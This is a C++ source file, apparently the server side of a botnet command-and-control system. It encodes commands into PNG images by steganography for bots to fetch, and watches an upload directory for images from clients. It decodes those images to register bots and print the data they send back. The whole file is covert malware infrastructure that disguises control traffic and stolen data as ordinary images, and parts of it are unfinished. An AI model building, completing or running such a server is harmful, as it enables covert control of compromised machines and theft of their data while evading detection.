#ifndef SERVER_H
#include "server.h"
#include "stegImage.h"
#include <getopt.h>

#include "cli.h"
#include <dirent.h>
#include <sys/inotify.h>
#include <sys/types.h>
#include <thread>
#include <mutex>
#include <condition_variable>

#endif

static struct option gLongOptions[] = {
    {"port", required_argument, NULL, 'p'},
    {"threads", required_argument, NULL, 't'},
    
};
//Job to parse incoming data from clients
void job();
//Mutex for files
std::mutex mapMutex;
//Condition variable
std::condition_variable fileCond;
//map vector to keep mutex of everything
std::map<std::string,int> fileMap;
//Bot Vector
std::map<int,std::string> bots;

int main(int argc, char *argv[]){
    int option_char = 0;           //Options (Need to implement later)
    std::string port = "8080";      //Port number to bind to
    int nthreads = 10;              //Worker threads (Will implement later)
    cli cliInterface;
    cliInterface.init(&cliInterface);

    //pthread_create(&cliThread, NULL,cli::cliPerform, &cliInterface);
   // pthread_create(&jobThread, NULL,job, NULL);
    std::thread cliT(cli::cliPerform, &cliInterface);
    std::thread jobT(job);
    //Initial Command
    std::string command = DEFAULT_COMMAND;             //Default command to send client. Client will read this, and connect to us.
    std::string dImage = DEFAULT_RPATH;                //Default png file to edit
    std::string wImage = DEFAULT_PATH;                 //Default image client will request
    stegImage encodeImage;
    //Encode Initial Command into image
    encodeImage.readPNG(&dImage);
    encodeImage.encodeImage(command);   
    encodeImage.writePNG(&wImage);
    //Set the socket port/Maxpending connections
    Server socketServer(100,port);
    //Perform (Accept connects, perform GET/POST Requests)
    socketServer.perform();
    
}


//Purpose of job is to monitor the resources tab for incoming files from the client, and if recieved parse and process the data
void job(){
    int count = 0;
    int inotFd;
    int watch;
    char dirBuff[1024];
    struct inotify_event *event;
    int length;
    std::string fileName;
    stegImage image;
    std::string data;
    std::string type;
    //Initialize Inotify
    if((inotFd = inotify_init()) == -1){
        DEBUG_PRINT((stdout,"Error: Failed to init inotify, Errno: %s\n",strerror(errno)));
        exit(EXIT_FAILURE);
    }
    //Create watch to monitory resources directory for file additions
    if((watch = inotify_add_watch(inotFd,"resources", IN_CREATE)) == -1){
        DEBUG_PRINT((stdout,"Error: Failed to create inotify watch Errno: %s\n",strerror(errno)));
        exit(EXIT_FAILURE);
    }

    while(true){
        //Check for inotify events using read on the inotify fd
        if((length = read(inotFd,dirBuff,1024)) == -1){
            DEBUG_PRINT((stdout,"Error: Failed to read inotify Errno: %s", strerror(errno)));
            continue;
        }
        //Set the struct of the buffer to a inotify event for reading.
        event = (struct inotify_event *)&dirBuff[0];
        if(event->mask == IN_CREATE){
            if(event->len > 0){
                //Grabe Data from Image
                fileName = "resources/";
                fileName.append(event->name);
                DEBUG_PRINT((stdout,"Waiting for file to be accessible\n"));
                //Wait until file is completely written and ready to be processed
                std::unique_lock<std::mutex> lockF(mapMutex);
                while(fileMap.find(fileName)->second != 0){
                    fileCond.wait(lockF);
                }
                lockF.unlock();
                //Read the image into memory
                if(image.readPNG(&fileName) == -1){
                    DEBUG_PRINT((stdout,"Failed to read Image from client\n"));  
                    image.cleanup();   
                    continue;     
                }
                //Decode the image
                if(image.decodeImage(&data) == -1){
                    DEBUG_PRINT((stdout,"Failed to decode image from client \n"));   
                    image.cleanup();
                    continue;       
                }
                image.cleanup();
                fileMap.erase(fileName);
                
                type = data.substr(data.find_first_of("<") + 1,data.find_first_of(":") - 1);
                DEBUG_PRINT((stdout,"Type of request: %s \n", type.c_str()));          
                if(type == "INIT"){
                    DEBUG_PRINT((stdout,"Updating Bot\n"));          
                    bots.insert(std::make_pair(count,data.substr(data.find_first_of(":") + 1, data.find_first_of(">") -data.find_first_of(":")-1)));
                    count++;
                }
                if(type == "DATA"){
                    int count = fwrite(data.c_str(),data.length(), 1, stdout);
                    fprintf(stdout,"%d", count);
                }

                //cleanup
                data.clear();
                type.clear();
                //Remove File
                remove(fileName.c_str());
            }
        }
    }
}